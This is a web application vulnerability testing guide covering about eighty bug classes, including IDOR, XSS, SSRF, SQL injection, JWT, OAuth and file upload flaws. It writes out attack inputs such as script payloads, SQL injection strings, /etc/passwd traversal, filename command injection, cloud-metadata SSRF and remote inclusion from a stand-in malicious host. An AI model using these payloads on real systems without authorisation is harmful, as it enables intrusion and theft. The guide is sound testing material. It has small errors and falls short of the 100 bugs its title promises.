---
title: "Vulnerability Testing Guide:   100 different bugs and how to identify them"
tags:
  - vulnerability
---

IDOR on User Profile Update

Parameter Manipulation: Log in as a low-privilege user (e.g., user_id=123). Intercept a profile update request (e.g., POST /api/profile/update) using Burp Suite. Change the user_id parameter to another user’s ID (e.g., user_id=124). If the server updates the other user’s profile, it’s vulnerable.
Sequential ID Testing: Identify the user_id in a profile update request (e.g., /profile/update?user_id=123). Increment or decrement the ID (e.g., user_id=122 or 124) and resend. Check if unauthorized data is modified or returned.
GUID Brute-Forcing: If the API uses UUIDs (e.g., /api/profile/550e8400-e29b-41d4-a716-446655440000), obtain valid UUIDs from other users (e.g., via shared links or enumeration). Test updating another user’s profile by substituting their UUID.

IDOR via Email Enumeration

Registration Form Testing: On the registration page, attempt to register with an existing email (e.g., test@example.com). If the server responds with “Email already exists,” it confirms the email’s presence, indicating an IDOR vulnerability.
Password Reset Enumeration: Submit a password reset request for various emails via the forgot-password endpoint (e.g., POST /api/reset-password). If responses differ (e.g., “Email sent” vs. “Email not found”), you can enumerate valid emails.
API Response Analysis: Intercept API calls (e.g., GET /api/user/check?email=test@example.com). If the server returns different status codes or messages for existing vs. non-existing emails, it’s exploitable.

IDOR on Subscription APIs

Subscription ID Manipulation: Log in as a user and access a subscription endpoint (e.g., GET /api/subscription/12345). Change the subscription_id to another value (e.g., 12346). If you access or modify another user’s subscription, it’s vulnerable.
Cross-Tenant Testing: If the platform supports multiple tenants, access a subscription API (e.g., POST /api/subscription/update) with a subscription_id from another tenant. Verify if unauthorized access is granted.
Missing Authorization Check: Use a low-privilege account to call a subscription management endpoint (e.g., DELETE /api/subscription/12345). If the action succeeds without proper ownership validation, it’s an IDOR.

Broken Object-Level Authorization in API

Object ID Tampering: Intercept an API request (e.g., GET /api/documents/1001) and change the object ID (e.g., 1002). If the server returns or allows modification of another user’s object, it lacks proper authorization.
Batch Request Testing: If the API supports batch operations (e.g., POST /api/documents/batch), include IDs of objects belonging to other users. Check if the server processes unauthorized objects.
Role-Based Testing: Use an account with minimal permissions to access restricted objects (e.g., GET /api/admin/reports/100). If access is granted, it indicates broken object-level authorization.

Reflected XSS in Search Bar

Basic Payload Injection: Enter a payload like <script>alert('XSS')</script> in the search bar (e.g., /search?q=alert('XSS')). If the payload is reflected in the response and executes, it’s vulnerable.
Encoded Payload Testing: Try URL-encoded payloads (e.g., %3Cscript%3Ealert('XSS')%3C/script%3E) in the search query. Check if the browser executes the script after decoding.
Event-Based Payload: Inject <img src=x onerror=alert('XSS')> in the search bar. If the script executes due to the onerror event, it confirms reflected XSS.

Stored XSS in Comments

Comment Payload Injection: Post a comment with <script>alert('XSS')</script> on a blog or forum. If the script executes when other users view the comment, it’s vulnerable.
HTML Tag Abuse: Submit a comment with <img src=x onerror=alert('XSS')>. Check if the payload executes when the comment is rendered on the page.
Markdown or BBCode Testing: If comments support markdown, try [img]x[/img] or <a href="javascript:alert('XSS')">Click</a>. Verify if the payload triggers on rendering.

DOM-Based XSS in JS-Heavy Pages

URL Parameter Injection: Access a JS-heavy page with a malicious parameter (e.g., /page#payload=alert('XSS')). If client-side JS processes the parameter unsafely (e.g., via document.write), it’s vulnerable.
Location Hash Testing: Inject #<img src=x onerror=alert('XSS')> into the URL. If the page’s JavaScript parses the hash and renders it, it confirms DOM-based XSS.
PostMessage Exploitation: If the page uses window.postMessage, send a message with a malicious payload (e.g., <script>alert('XSS')</script>) via a crafted page. Check if the receiving page processes it unsafely.

XSS via SVG Upload

SVG with Script Tag: Upload an SVG file containing <svg><script>alert('XSS')</script></svg>. Access the uploaded file’s URL. If the script executes, it’s vulnerable.
Event Handler in SVG: Upload an SVG with <svg onload=alert('XSS')>. If the event triggers when the file is viewed, it confirms XSS.
Xlink Payload: Upload an SVG with <a xlink:href="javascript:alert('XSS')">. If clicking the link executes the script, it’s exploitable.

XSS via Malformed JSON

JSON Key Injection: Send a JSON payload with a malicious key (e.g., {"name":"<script>alert('XSS')</script>"}) to an endpoint. If the response renders the key unsanitized, it’s vulnerable.
JSON Value Injection: Submit {"comment":"</script><script>alert('XSS')</script>"}. If the value is rendered in the DOM without escaping, it triggers XSS.
Array-Based Payload: Send ["<img src=x onerror=alert('XSS')>"] to an API. If the frontend renders the array element unsafely, it confirms the vulnerability.

HTML Injection in Emails

HTML Tag Injection: In an email input field (e.g., contact form), submit <b>Test</b> or <img src=x onerror=alert('XSS')>. If the email renders the tags, it’s vulnerable.
CSS Injection: Submit <style>body{background:red}</style> in an email template field. If the email applies the styles, it indicates HTML injection.
Iframe Injection: Inject <iframe src="malicious.com"></iframe> into an email field. If the iframe loads in the email, it confirms the vulnerability.

Open Redirect via Query Param

Redirect Parameter Testing: Access a URL like /redirect?url=http://malicious.com. If the server redirects to the malicious site, it’s vulnerable.
Encoded URL Testing: Try /redirect?url=%68%74%74%70%3A%2F%2Fmalicious.com. If the server decodes and redirects, it confirms an open redirect.
Double Encoding: Inject /redirect?url=//malicious.com%252fpath. If the server redirects to malicious.com, it’s exploitable.

Open Redirect with Base64 Trick

Base64 URL Injection: Submit a redirect URL like /redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=. If it redirects and executes, it’s vulnerable.
Encoded Malicious URL: Use /redirect?url=base64://aHR0cDovL21hbGljaW91cy5jb20=. If the server decodes and redirects, it confirms the issue.
Nested Encoding: Try /redirect?url=data://base64,YUhSMGNITTZMeTk=. If the server processes the nested encoding and redirects, it’s exploitable.

Unsafe Redirect in Logout Flow

Logout URL Testing: Access /logout?next=http://malicious.com. If the server redirects to the malicious site after logout, it’s vulnerable.
Parameter Tampering: Intercept the logout request and modify the next or return parameter to a malicious URL. If redirected, it confirms the issue.
Relative Path Testing: Try /logout?next=//malicious.com. If the server redirects to the external site, it’s an unsafe redirect.

Unsafe Redirect after Login

Login Redirect Testing: Log in with a URL like /login?redirect=http://malicious.com. If the server redirects post-login, it’s vulnerable.
Encoded Redirect: Try /login?redirect=%2F%2Fmalicious.com. If the server decodes and redirects, it confirms the vulnerability.
Path Traversal Redirect: Inject /login?redirect=../../malicious.com. If the server redirects to the external site, it’s exploitable.

Logic Flaw in Shopping Cart

Quantity Manipulation: Add an item to the cart and intercept the request (e.g., POST /cart/add). Change the quantity to a negative value (e.g., quantity=-10). If the total price becomes negative, it’s a logic flaw.
Item Swapping: Add a cheap item to the cart, then intercept and replace its item_id with an expensive one’s ID. If the price remains low, it’s vulnerable.
Discount Misapplication: Apply a discount code, then add/remove items. If the discount persists for ineligible items, it indicates a flaw.

Price Manipulation via Hidden Input

Hidden Field Tampering: Inspect a checkout form for hidden inputs (e.g., <input type="hidden" name="price" value="100">). Change the price to a lower value (e.g., 1) using Burp Suite. If the server accepts it, it’s vulnerable.
Client-Side Calculation: If the price is calculated client-side, modify the JavaScript (e.g., via browser dev tools) to set a lower price. Submit and check if the server honors it.
Multiple Hidden Fields: If multiple price fields exist, tamper with one (e.g., final_price vs. display_price). If the server uses the tampered value, it confirms the issue.

Coupon Abuse

Multiple Coupon Application: Apply a coupon code, then intercept the request and reapply the same code multiple times. If the discount stacks, it’s vulnerable.
Expired Coupon Testing: Use an expired or invalid coupon code by modifying the request (e.g., coupon=EXPIRED2023). If the server accepts it, it’s a logic flaw.
Cross-User Coupon: Obtain a single-use coupon code, then use it with another account by intercepting the request. If it applies, it indicates coupon abuse.

Duplicate Purchase via Race Condition

Parallel Requests: Use Burp Intruder to send multiple simultaneous purchase requests (e.g., POST /api/purchase) with the same order_id. If multiple purchases succeed, it’s a race condition.
Session Overlap: Open two browser sessions, add an item to the cart, and submit payment requests concurrently. If both succeed for a single-use item, it’s vulnerable.
API Token Reuse: If the API uses a token for purchases, send rapid requests with the same token. If multiple transactions process, it confirms the issue.

Bypassing Paywall via Caching

Cache Header Testing: Access a paywalled page and check response headers (e.g., Cache-Control: public). If cached, access via a proxy or CDN to retrieve the content.
Cached Static Content: Use Google’s cache (e.g., cache:example.com/article) to view paywalled content. If accessible, it’s a bypass.
Service Worker Bypass: If the site uses service workers, inspect cached responses in dev tools. If premium content is cached client-side, it can be accessed.

Business Logic Flaw in Refunds

Negative Refund Amount: Initiate a refund request and intercept it (e.g., POST /api/refund). Set the amount to a negative value (e.g., amount=-100). If the server processes a credit, it’s vulnerable.
Multiple Refunds: Submit multiple refund requests for the same order_id in quick succession. If all are processed, it indicates a logic flaw.
Refund Without Purchase: Forge a refund request for a non-existent order_id. If the server issues a refund, it’s exploitable.

Flawed Invite/Token Logic

Token Reuse: Obtain an invite token (e.g., invite_token=abc123) and use it multiple times or across accounts. If it grants access repeatedly, it’s vulnerable.
Token Enumeration: Guess or brute-force invite tokens (e.g., sequential IDs or short hashes). If a valid token grants access, it indicates a flaw.
Expired Token Testing: Use an expired invite token by intercepting and reusing it. If the server accepts it, it’s a logic issue.

SSRF in PDF Generator

URL Parameter Injection: If the PDF generator accepts URLs (e.g., /pdf?url=http://internal.com), inject http://localhost:8080 or http://169.254.169.254 (cloud metadata). Check if internal data is returned.
File Protocol Testing: Try file:///etc/passwd in the URL parameter. If the server fetches local files, it confirms SSRF.
DNS-Based SSRF: Use a URL like http://attacker.com (pointing to an internal IP). Monitor DNS requests to confirm server-side fetching.

SSRF via Webhook Feature

Webhook URL Injection: Set a webhook URL to http://localhost:8080 or http://169.254.169.254. If the server sends a request and returns internal data, it’s vulnerable.
Internal Service Probing: Use http://internal-service:port as the webhook URL. If the server connects, it confirms SSRF.
Blind SSRF Testing: Set the webhook to a controlled server (e.g., http://attacker.com/log). If a request is received, it indicates SSRF.

Blind SSRF via Image Fetcher

Image URL Injection: Submit an image URL like http://169.254.169.254/latest/meta-data/ to an image fetcher endpoint. If metadata is fetched, it’s vulnerable.
Controlled Server Testing: Use http://attacker.com/image.jpg and monitor for server requests. If the server fetches the image, it confirms blind SSRF.
Internal IP Probing: Try http://10.0.0.1/image.jpg. If the server attempts to fetch it, it indicates SSRF.

SSRF Using DNS Rebinding

DNS Rebinding Setup: Host a domain (e.g., attacker.com) that alternates between an external IP and an internal one (e.g., 127.0.0.1) via DNS rebinding. Submit http://attacker.com to an endpoint. If internal data is accessed, it’s vulnerable.
Time-Based Rebinding: Use a rebinding service (e.g., rbndr.us) to switch IPs after a delay. If the server fetches internal resources, it confirms SSRF.
Webhook Rebinding: Set a webhook to a rebinding domain. Monitor for internal service access to confirm the vulnerability.

SSRF via Cloud Metadata Endpoint

Metadata URL Injection: Submit http://169.254.169.254/latest/meta-data/ to an endpoint (e.g., /fetch?url=). If cloud metadata is returned, it’s vulnerable.
Regional Metadata Testing: Try region-specific metadata URLs (e.g., http://169.254.169.254/latest/meta-data/iam/). If sensitive data is fetched, it confirms SSRF.
Blind Metadata Fetch: Use a URL like http://169.254.169.254/latest/user-data and check for server-side errors or data leaks.

Broken Authentication Bypass

Parameter Removal: Intercept a login request and remove authentication headers (e.g., Authorization: Bearer). If the server grants access, it’s vulnerable.
Role Switching: Log in as a low-privilege user and change the role parameter (e.g., role=admin) in a request. If elevated access is granted, it’s a bypass.
Cookie Manipulation: Modify session cookies to use another user’s session ID. If access is granted, it indicates broken authentication.

Insecure Password Reset Token

Token Predictability: Request a password reset and analyze the token (e.g., reset_token=12345). If it’s sequential or short, try guessing others. If successful, it’s vulnerable.
Token Reuse: Use a reset token multiple times or after resetting. If it’s accepted, it indicates insecurity.
Token Exposure: Check if the reset token is exposed in the URL (e.g., /reset?token=abc123). If it’s not validated properly, it’s exploitable.

Missing Rate Limit on Login

Brute-Force Testing: Use Burp Intruder to send rapid login requests with different passwords for a user. If no lockout or delay occurs, it’s vulnerable.
Parallel Login Attempts: Script multiple simultaneous login attempts (e.g., via Python requests). If all are processed without restriction, it confirms the issue.
CAPTCHA Bypass: If a CAPTCHA is present, check if it’s enforced after multiple attempts. If not, it indicates a missing rate limit.

No Lockout After Failed Login Attempts

Repeated Login Testing: Attempt login with incorrect passwords multiple times (e.g., 100 attempts). If the account remains accessible, it’s vulnerable.
API Login Testing: Send rapid incorrect login requests to an API endpoint (e.g., POST /api/login). If no lockout occurs, it confirms the issue.
IP-Based Testing: Try logins from different IPs for the same account. If no lockout is enforced, it’s exploitable.

JWT Token None Algorithm

Algorithm Switching: Decode a JWT token and change the algorithm to none (e.g., {"alg":"none"}). If the server accepts it, it’s vulnerable.
Signature Removal: Remove the signature part of the JWT (e.g., header.payload.) and send it. If the server processes it, it confirms the issue.
Empty Signature: Set the signature to an empty string (e.g., header.payload.). If accepted, it’s a none algorithm vulnerability.

JWT with Weak Secret

Brute-Forcing Secret: Use tools like jwt_tool to brute-force the JWT secret with a wordlist. If a weak secret (e.g., “password”) is cracked, it’s vulnerable.
Known Secret Testing: If the app uses a default or predictable secret (e.g., “secret123”), sign a JWT with it. If it’s accepted, it confirms the issue.
Leaked Secret Testing: Check public repositories or error messages for exposed secrets. Use them to forge a JWT and test access.

JWT with Overly Long Expiration

Token Expiry Check: Decode a JWT and check the exp claim. If it’s set to a distant future (e.g., years ahead), it’s overly long.
Expired Token Testing: Use an old JWT after its supposed expiration. If it’s still valid, it indicates a long expiration issue.
Token Reuse: Reuse a JWT after a long period (e.g., months). If it grants access, it confirms the vulnerability.

Broken Session Invalidation on Logout

Session Reuse: Log out and capture the session cookie. Reuse it in a new request (e.g., GET /profile). If access is granted, it’s vulnerable.
Token Persistence: After logout, use the same JWT or session token in an API call. If it’s accepted, it confirms broken invalidation.
Concurrent Session Testing: Log out from one device and test the session on another. If still valid, it indicates the issue.

Session Fixation

Pre-Login Cookie Testing: Access the login page and note the session cookie. Log in and check if the same cookie is used. If so, it’s vulnerable.
Forced Cookie Injection: Set a session cookie (e.g., session=abc123) before login via a malicious link. If the server uses it post-login, it’s exploitable.
Cross-User Testing: Log in with a fixed session ID, then use it with another account. If the session persists, it confirms fixation.

Default Credentials Active

Common Credentials Testing: Try default credentials (e.g., admin:admin, root:root) on login pages or admin panels. If they work, it’s vulnerable.
API Default Access: Test API endpoints with default credentials (e.g., Authorization: Basic YWRtaW46YWRtaW4=). If access is granted, it confirms the issue.
Device or Service Testing: If the app integrates with devices (e.g., IoT), try default credentials like admin:password. If successful, it’s exploitable.

Bypassing Email Verification

Skipping Verification: Register an account and intercept the verification request. Skip the verification step and access the account. If successful, it’s vulnerable.
Token Manipulation: Capture the email verification token and modify it (e.g., change user_id). If the server accepts it, it’s a bypass.
Direct Access Testing: After registration, try accessing protected endpoints without verifying the email. If access is granted, it confirms the issue.

No MFA Enforced for Admin

Admin Login Testing: Log in to an admin account without being prompted for MFA. If access is granted, it’s vulnerable.
API Admin Access: Use an admin’s credentials to access an API endpoint (e.g., GET /api/admin/users) without MFA. If successful, it confirms the issue.
MFA Bypass: If MFA is optional, try disabling it or bypassing the prompt (e.g., via direct URL access). If access is granted, it’s exploitable.

OAuth Misconfiguration (Open Redirect)

Redirect URI Tampering: During OAuth flow, modify the redirect_uri parameter (e.g., redirect_uri=http://malicious.com). If redirected, it’s vulnerable.
Unvalidated Redirect: Test the OAuth provider’s redirect_uri with a malicious URL (e.g., //attacker.com). If the provider redirects, it confirms the issue.
Encoded Redirect URI: Try redirect_uri=%68%74%74%70%3A%2F%2Fmalicious.com. If the server decodes and redirects, it’s exploitable.

OAuth Token Leakage via Referer

Referer Header Check: Log in via OAuth and monitor the Referer header in requests. If the access token is included, it’s vulnerable.
External Redirect Testing: Click an external link during the OAuth flow. If the Referer header leaks the token, it confirms the issue.
JavaScript Redirect: If the OAuth flow uses client-side redirects, check if the token is exposed in the URL and sent via Referer.

OAuth Scope Escalation

Scope Parameter Tampering: In the OAuth request, modify the scope parameter (e.g., scope=read+write instead of read). If elevated access is granted, it’s vulnerable.
Unvalidated Scope: Request excessive scopes (e.g., scope=admin_access). If the server grants them without validation, it confirms the issue.
Cross-Client Scope Testing: Use a client_id from another app to request sensitive scopes. If accepted, it indicates scope escalation.

SAML Signature Bypass

Signature Removal: Intercept a SAML response and remove the XML signature. If the server accepts it, it’s vulnerable.
Signature Tampering: Modify the SAML assertion (e.g., change user_id) and resign with a forged key. If accepted, it confirms the bypass.
XML Comment Injection: Add XML comments (e.g., ) around the signature. If the server ignores the signature, it’s exploitable.

CSRF on Profile Update

CSRF Form Submission: Create a malicious HTML form (e.g., <form action="https://example.com/profile/update" method="POST">) with preset values. If it updates the profile without a token, it’s vulnerable.
No Token Validation: Intercept a profile update request and remove the CSRF token. If the server processes it, it confirms the issue.
GET-Based CSRF: If the update uses GET (e.g., /profile/update?name=test), craft a URL with malicious parameters. If it succeeds, it’s exploitable.

CSRF on Account Deletion

Malicious Form Testing: Create a form submitting to /account/delete with method=POST. If the account is deleted without a token, it’s vulnerable.
Token Absence: Intercept a deletion request and remove the CSRF token. If the server allows deletion, it confirms the issue.
Image-Based CSRF: Use <img src="https://example.com/account/delete">. If the account is deleted on image load, it’s exploitable.

CORS Misconfiguration (Wildcard with Credentials)

Wildcard Origin Testing: Send a request with Origin: http://malicious.com and check if the response includes Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. If so, it’s vulnerable.
Cross-Origin Request: From a malicious site, send a fetch request with credentials to an API endpoint. If data is returned, it confirms the issue.
Preflight Bypass: Send a complex request (e.g., with custom headers) and check if the server allows it without proper origin validation.

Overly Permissive CORS Policy

Arbitrary Origin Testing: Set Origin: http://attacker.com in a request. If the server responds with Access-Control-Allow-Origin: http://attacker.com, it’s vulnerable.
Null Origin Testing: Use Origin: null in a request. If the server allows it, it confirms a permissive policy.
Wildcard Subdomain Testing: Try Origin: sub.attacker.com on a domain allowing *.example.com. If accepted, it’s exploitable.

Improper Cookie Flags (Missing HttpOnly/Secure)

HttpOnly Check: Inspect cookies in the browser’s dev tools. If sensitive cookies (e.g., session cookies) lack HttpOnly, they’re vulnerable to XSS.
Secure Flag Testing: Check if cookies are sent over HTTP (not HTTPS). If the Secure flag is missing, it’s vulnerable.
Cookie Sniffing: Use an XSS payload to access document.cookie. If sensitive cookies are accessible, it confirms the issue.

Content-Security-Policy Misconfigured

Inline Script Testing: Inject <script>alert('XSS')</script> on a page with CSP. If it executes, the CSP is misconfigured (e.g., unsafe-inline).
External Script Injection: Try <script src="http://malicious.com/evil.js">. If it loads, the CSP lacks proper source restrictions.
Missing CSP Header: Check response headers for Content-Security-Policy. If absent or overly permissive (e.g., script-src *), it’s vulnerable.

Unsafe File Upload (No Content-Type Check)

Malicious File Upload: Upload a file like evil.php with a valid extension but malicious content. If the server executes it, it’s vulnerable.
Content-Type Spoofing: Upload a file with a fake Content-Type (e.g., image/jpeg for a PHP script). If accepted, it confirms the issue.
Double Extension: Upload image.jpg.php. If the server processes it as PHP, it indicates a lack of content-type validation.

MIME Type Confusion on Uploads

MIME Mismatch: Upload a file with a mismatched MIME type (e.g., text/html for image.jpg). If the server serves it as HTML, it’s vulnerable.
Polyglot File: Upload a file that’s both a valid image and script (e.g., JPEG with embedded JavaScript). If executed, it confirms MIME confusion.
Extension vs. MIME: Upload a file with extension .jpg but MIME type text/html. If the server trusts the extension, it’s exploitable.

Directory Traversal in File Viewer

Path Traversal Testing: Access a file viewer URL (e.g., /view?file=document.pdf) and inject ../../etc/passwd. If sensitive files are accessed, it’s vulnerable.
Encoded Traversal: Try ../%2e%2e/etc/passwd. If the server decodes and serves the file, it confirms the issue.
Absolute Path Testing: Use /view?file=/etc/passwd. If the server returns the file, it’s a directory traversal vulnerability.

Uploading Polyglot Files

JPEG-Script Polyglot: Create a file that’s a valid JPEG but contains <script>alert('XSS')</script>. Upload and access it. If the script executes, it’s vulnerable.
PDF-JavaScript Polyglot: Upload a PDF with embedded JavaScript. If the script runs when opened, it confirms the issue.
GIF-Script Polyglot: Upload a GIF with embedded HTML/JS. If the server serves it as HTML, it’s exploitable.

File Inclusion via Upload & Access

Local File Inclusion: Upload a file (e.g., evil.php) and access it via /include?file=uploads/evil.php. If executed, it’s vulnerable.
Remote File Inclusion: Try /include?file=http://malicious.com/evil.php. If the server includes and executes it, it confirms the issue.
Path Manipulation: Upload a file and access it via /include?file=../uploads/evil.php. If included, it’s exploitable.

Null Byte Injection in File Path

Null Byte Testing: Upload a file with a name like evil.php%00.jpg. If the server processes it as evil.php, it’s vulnerable.
Path Traversal with Null: Try /view?file=../../etc/passwd%00. If the null byte bypasses filters, it confirms the issue.
API Parameter Injection: Send a file path with %00 in an API request (e.g., /api/file?path=config%00.txt). If sensitive files are accessed, it’s exploitable.

Command Injection via Filename

Command in Filename: Upload a file named test;whoami.jpg. If the server executes the command, it’s vulnerable.
Pipe Injection: Try a filename like test|id.jpg. If the server runs the command and returns output, it confirms the issue.
Encoded Command: Upload test%3Bls.jpg. If the server decodes and executes, it’s exploitable.

Unsafe Deserialization (PHP, Java)

PHP Object Injection: If the app uses PHP, send a serialized object (e.g., O:4:"Test":1:{s:4:"data";s:3:"cmd";}) to an endpoint. If it triggers unexpected behavior, it’s vulnerable.
Java Deserialization: For Java apps, craft a serialized object using ysoserial (e.g., CommonsCollections gadget). If it executes commands, it confirms the issue.
Base64 Serialized Data: Send a base64-encoded serialized object. If the server deserializes and executes, it’s exploitable.

SQL Injection on Rare Parameter

Parameter Testing: Identify uncommon parameters (e.g., sort, filter) in a URL (e.g., /search?sort=id). Append ' OR 1=1--. If the response changes, it’s vulnerable.
Blind SQL Injection: Inject 1' AND SLEEP(5)-- into a rare parameter. If the response delays, it confirms blind SQLi.
Union-Based Injection: Try 1' UNION SELECT 1,2,3--. If additional data is returned, it indicates SQL injection.

GraphQL Injection

Query Injection: In a GraphQL query, inject ' OR 1=1 into a field (e.g., {user(id:"1' OR 1=1")}). If unauthorized data is returned, it’s vulnerable.
Blind Injection: Inject AND SLEEP(5) into a GraphQL field. If the response delays, it confirms the issue.
Union Injection: Try a union-based payload in a query (e.g., union select null,null). If extra data is returned, it’s exploitable.

HTTP Parameter Pollution

Duplicate Parameters: Send a request with repeated parameters (e.g., /action?id=1&id=2). If the server processes unexpected values, it’s vulnerable.
Parameter Overriding: In a POST request, add a query parameter with the same name (e.g., POST /update?name=admin&name=user). If the server uses the wrong value, it’s exploitable.
API Confusion: Send conflicting parameters to an API (e.g., user_id=1&user_id=2). If it causes unintended behavior, it confirms HPP.

Using CRLF to Inject Headers

CRLF Injection: In a parameter, inject %0D%0ASet-Cookie: session=malicious. If the response sets the cookie, it’s vulnerable.
Header Splitting: Try param=value%0D%0AX-Header: malicious. If the server includes the custom header, it confirms the issue.
Redirect Injection: Inject %0D%0ALocation: http://malicious.com. If the server redirects, it’s exploitable.

Using Unicode to Bypass Filters

Unicode Payload: Inject Unicode characters (e.g., U+00A0<script>alert('XSS')</script>) in an input field. If it executes, filters are bypassed.
Encoded Unicode: Try %E2%80%A8<script>alert('XSS')</script>. If the server processes it, it confirms the vulnerability.
Case Normalization: Use Unicode case variants (e.g., ＳＣＲＩＰＴ instead of script). If the payload executes, it’s exploitable.

GraphQL Introspection Enabled

Introspection Query: Send {__schema{types{name}}} to the GraphQL endpoint. If schema details are returned, introspection is enabled.
Type Enumeration: Query {__type(name:"User"){fields{name}}}. If user-related fields are exposed, it confirms the issue.
Directive Testing: Try {__schema{directives{name}}}. If directives are listed, it indicates an open introspection.

GraphQL Rate Limit Missing

Rapid Query Testing: Send multiple GraphQL queries (e.g., 1000 queries via script) in a short time. If all are processed, it’s vulnerable.
Complex Query Spam: Send complex queries (e.g., nested fields) repeatedly. If no throttling occurs, it confirms the issue.
Batch Query Testing: Send a batch of queries in a single request. If processed without limits, it’s exploitable.

Mass Assignment in REST API

Extra Parameter Injection: In a POST request (e.g., /api/user/update), add an unauthorized field (e.g., role=admin). If the server updates it, it’s vulnerable.
Hidden Field Testing: Send a JSON payload with sensitive fields (e.g., {"is_admin":true}). If the server processes it, it confirms mass assignment.
PUT Request Testing: Use a PUT request to update fields not intended for users (e.g., {"user_level":999}). If successful, it’s exploitable.

API Allows Deleting Arbitrary Users

User ID Manipulation: Send a DELETE request to /api/users/123 with another user’s ID. If the user is deleted, it’s vulnerable.
Batch Deletion: Try a batch DELETE request with multiple user IDs (e.g., {"ids":[123,124]}). If unauthorized users are deleted, it confirms the issue.
Low-Privilege Testing: Use a low-privilege account to delete a user (e.g., DELETE /api/users/admin). If successful, it’s exploitable.

Missing Access Control on Internal Docs

Direct URL Access: Try accessing /internal/docs or /api/internal without authentication. If documents are returned, it’s vulnerable.
Role-Based Testing: Log in as a non-admin and access /admin/docs. If access is granted, it confirms the issue.
Hidden Endpoint Testing: Guess internal endpoints (e.g., /internal/reports). If accessible, it indicates missing controls.

API Key Reuse Across Environments

Key Testing Across Domains: Obtain an API key from a staging environment (e.g., staging.example.com) and use it on production (api.example.com). If it works, it’s vulnerable.
Leaked Key Testing: Find an API key in public code (e.g., GitHub) and test it on multiple environments. If it grants access, it confirms the issue.
Key Scope Testing: Use a key meant for limited access (e.g., read-only) in a privileged endpoint. If successful, it’s exploitable.

Credential Stuffing on Forgotten Endpoints

Old Endpoint Testing: Identify deprecated login endpoints (e.g., /v1/login) via API documentation or fuzzing. Try credential stuffing with known credentials. If successful, it’s vulnerable.
Hidden Form Testing: Find forgotten login forms (e.g., /old-login) and attempt stuffing with a wordlist. If logins succeed, it confirms the issue.
API Stuffing: Use Burp Intruder to test an old API endpoint with credential lists. If access is granted, it’s exploitable.

Rate-Limit Bypass Using X-Forwarded-For

Header Manipulation: Send rapid requests with different X-Forwarded-For headers (e.g., 1.1.1.1, 2.2.2.2). If the rate limit is bypassed, it’s vulnerable.
Proxy Rotation: Use multiple proxy IPs in the X-Forwarded-For header. If requests are processed without limits, it confirms the issue.
Header Stacking: Send X-Forwarded-For: 1.1.1.1, 2.2.2.2. If the server trusts the header and bypasses limits, it’s exploitable.

Authentication Bypass with Null Bytes

Null Byte in Credentials: Send a login request with a username like admin%00. If the server bypasses authentication, it’s vulnerable.
API Parameter Testing: In an API request, append %00 to a user_id (e.g., user_id=123%00). If access is granted, it confirms the issue.
Token Injection: Add %00 to a token (e.g., token=abc123%00). If the server processes it incorrectly, it’s exploitable.

Host Header Injection

Host Header Tampering: Send a request with Host: malicious.com. If the server processes it or redirects, it’s vulnerable.
Cache Poisoning: Set Host: attacker.com and check if the response is cached with malicious content. If so, it confirms the issue.
Internal Host Testing: Use Host: localhost or Host: internal.service. If internal resources are accessed, it’s exploitable.

Abuse of Debug Endpoints

Endpoint Discovery: Fuzz for endpoints like /debug, /admin/debug, or /api/trace. If accessible, it’s vulnerable.
Parameter Exposure: Access /debug?verbose=true. If sensitive data (e.g., stack traces) is returned, it confirms the issue.
Unauthenticated Access: Try accessing debug endpoints without authentication. If successful, it’s exploitable.

Replay Attack on Payment Endpoint

Request Replay: Capture a payment request (e.g., POST /api/pay) and resend it multiple times. If multiple charges occur, it’s vulnerable.
Token Reuse: Reuse a payment token in a new request. If the server processes it, it confirms the issue.
Timestamp Manipulation: Modify the timestamp in a payment request and replay it. If accepted, it’s exploitable.

Leaked Credentials in JavaScript

Source Code Inspection: Inspect JavaScript files (e.g., /scripts/app.js) for hardcoded credentials (e.g., api_key=abc123). If found, it’s vulnerable.
Network Request Analysis: Monitor network requests for exposed credentials in JS variables. If sent to external servers, it confirms the issue.
Minified JS Search: Search minified JS for strings like key= or token=. If credentials are exposed, it’s exploitable.

Leaked API Keys in Mobile App

APK Decompilation: Decompile the mobile app’s APK using tools like JADX. Search for hardcoded API keys in the code. If found, it’s vulnerable.
Network Traffic Analysis: Use a proxy (e.g., Burp Suite) to capture app traffic. If API keys are sent in plain text, it confirms the issue.
Resource File Check: Extract the app’s resource files (e.g., strings.xml) for exposed keys. If present, it’s exploitable.

Token Leakage via JavaScript Var

Variable Inspection: Inspect JavaScript for variables like var token = "abc123". If accessible via XSS, it’s vulnerable.
Console Exposure: Check if tokens are logged to the console (e.g., console.log(token)). If so, it confirms the issue.
Global Variable Testing: Access a global variable (e.g., window.token) via dev tools. If it contains sensitive data, it’s exploitable.

Fuzzing Params to Find Debug Info

Parameter Fuzzing: Use Burp Intruder to test parameters like debug=true, verbose=1, or trace=on. If sensitive info is returned, it’s vulnerable.
Hidden Parameter Testing: Try appending ?log=full to endpoints. If debug data is exposed, it confirms the issue.
API Fuzzing: Fuzz API parameters (e.g., /api/data?param=test) for debug flags. If stack traces or configs are returned, it’s exploitable.

Using Alternative HTTP Methods (PUT, DELETE)

Method Switching: Change a GET request to PUT or DELETE (e.g., DELETE /api/resource/123). If unauthorized actions succeed, it’s vulnerable.
OPTIONS Testing: Send an OPTIONS request to identify allowed methods. If PUT/DELETE are allowed without checks, it confirms the issue.
Bypass via PUT: Use PUT to update resources (e.g., PUT /api/user/123) with unauthorized data. If successful, it’s exploitable.

Cache Poisoning via Host Header

Host Header Injection: Send a request with Host: malicious.com. If the response is cached, it’s vulnerable.
Cache Key Manipulation: Inject Host: attacker.com and check if the cache serves malicious content to other users.
Parameter-Based Poisoning: Combine Host with query params (e.g., ?cache=true). If cached with malicious content, it confirms the issue.

Cache Deception via File Extension

Extension Manipulation: Request /profile.css instead of /profile. If sensitive data is cached as a static file, it’s vulnerable.
Path Confusion: Try /api/user.json for a dynamic endpoint. If the response is cached, it confirms the issue.
MIME-Type Spoofing: Request a dynamic page with a static extension (e.g., /dashboard.png). If cached, it’s exploitable.

Hidden Admin Functionality in Frontend

Code Inspection: Inspect the frontend JavaScript for commented-out admin features (e.g., //adminPanel()). If accessible, it’s vulnerable.
Hidden Button Testing: Uncover hidden elements (e.g., <div style="display:none">) via dev tools. If admin functions are triggered, it confirms the issue.
URL Guessing: Access /admin or /manage endpoints found in JS. If unauthenticated access is granted, it’s exploitable.

Mobile App with Hardcoded Secrets

APK Analysis: Decompile the APK and search for secrets in strings.xml or code (e.g., api_key=abc123). If found, it’s vulnerable.
